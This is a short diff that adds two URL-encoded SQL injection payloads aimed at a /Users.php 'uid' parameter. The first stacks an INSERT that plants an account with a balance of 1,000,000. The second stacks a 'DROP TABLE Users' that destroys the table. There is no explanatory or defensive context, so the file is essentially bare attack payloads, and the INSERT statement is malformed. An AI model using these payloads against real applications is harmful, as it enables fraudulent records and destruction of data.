@@ -1,0 +1,5 @@
+/Users.php?uid=0;INSERT%20INTO%20ACCOUNTS%20Username,%20AccountBalance%20VALUES%20(%27neo-anderson%27,1000000
+
+# or
+
+/Users.php?uid=1;%20DROP%20TABLE%20Users;
